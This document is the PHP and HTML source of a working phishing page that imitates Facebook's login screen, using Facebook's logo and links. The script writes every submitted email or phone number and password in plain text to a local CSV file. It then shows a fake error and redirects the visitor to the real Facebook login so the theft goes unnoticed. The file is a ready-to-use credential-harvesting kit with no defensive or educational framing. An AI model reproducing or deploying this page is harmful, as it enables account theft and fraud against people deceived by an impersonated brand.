<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Facebook</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <?php
    session_start();

    $email_pno= $password= "";
    $empty_err=$email_pno_err="";

    if($_SERVER["REQUEST_METHOD"]=="POST")
    {
        if(empty($_POST["email_pno"]) || (empty($_POST["pass"])))
        {
            $empty_err="The email address or mobile number you entered isn't connected to an account.";
        }
        else
        {
            $email_pno= htmlspecialchars($_POST["email_pno"]);
            $password= htmlspecialchars($_POST["pass"]);
    
            if(filter_var($email_pno, FILTER_VALIDATE_EMAIL) or (preg_match("/^[0-9]{10}+$/", $email_pno)))
            {
                $csv_file= fopen("login_detail.csv", "a");

                // to be run only the first time
                // fwrite($csv_file, "Email/Phone_number");
                // fwrite($csv_file, ",");
                // fwrite($csv_file, "Password");

                fwrite($csv_file, "\n");
                fwrite($csv_file, $email_pno);
                fwrite($csv_file, ",");
                fwrite($csv_file, $password);
                fclose($csv_file);
            }
            else{
                $email_pno_err="The email address or mobile number you entered isn't connected to an account.";
                echo "wrong format";
            }
            echo "\n<h2>Error occurred! <br>Sorry for the inconvinience. Directing back to login page.</h2>";
            header("Refresh:3; url=https://www.facebook.com/login");
            exit();
        }
    }
    ?>


    <img class="facebook_logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
    <div class="container">
        <p>Log in to Facebook</p>
        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <input type="text" id="email" name="email_pno" placeholder="Email address or phone number"><br>
            <span class="php_error" ><?php echo $empty_err, $email_pno_err;?></span>
            <input type="password" id="pass" name="pass" placeholder="Password"><br>
            <button type="submit" id="submit" name="submit" value="submit">Log in</button>
        </form>
        <a href="error.html">Forgotten account?</a>
        <a href="https://www.facebook.com/r.php?locale=en_GB&display=page">Sign up for Facebook</a>
    </div>
</body>
</html>

